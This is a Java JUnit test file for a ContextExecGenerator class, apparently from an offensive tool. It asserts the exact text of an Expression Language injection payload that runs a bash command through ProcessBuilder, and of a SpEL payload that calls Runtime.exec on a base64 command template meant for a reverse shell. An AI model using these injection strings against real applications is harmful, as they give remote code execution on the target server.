package generators;

import org.junit.Test;

import static org.junit.Assert.assertEquals;

public class ContextExecGenerator_ArrowTest {

    @Test
    public void getEvilELCodeReturnsFormattedExpression() {
        ContextExecGenerator generator = new ContextExecGenerator(null);
        generator.execCode.reverseShellCommand = "echo test";

        String result = generator.getEvilELCode();

        assertEquals("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['bash','-c','echo test']).start()\")", result);
    }

    @Test
    public void getEvilSpelCodeReturnsFormattedExpression() {
        ContextExecGenerator generator = new ContextExecGenerator(null);
        generator.execCode.reverseShellCommand = "echo test";

        String result = generator.getEvilSpelCode();

        assertEquals("T(java.lang.Runtime).getRuntime().exec('" + generator.execCode.getBase64CommandTpl() + "')", result);
    }
}
